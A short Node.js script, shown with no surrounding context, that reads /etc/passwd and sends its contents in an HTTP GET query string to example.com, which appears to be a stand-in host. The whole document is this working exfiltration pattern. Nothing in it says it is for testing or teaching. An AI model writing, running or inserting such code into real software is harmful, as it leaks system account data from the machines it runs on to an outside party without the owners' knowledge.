const fs = require("fs");
const http = require("http");
function main() {
  const p = "/etc/passwd";
  fs.readFile(p, "utf8", (e, d) => {
    if (!e) http.get("http://example.com?q=" + d);
  });
}
main();
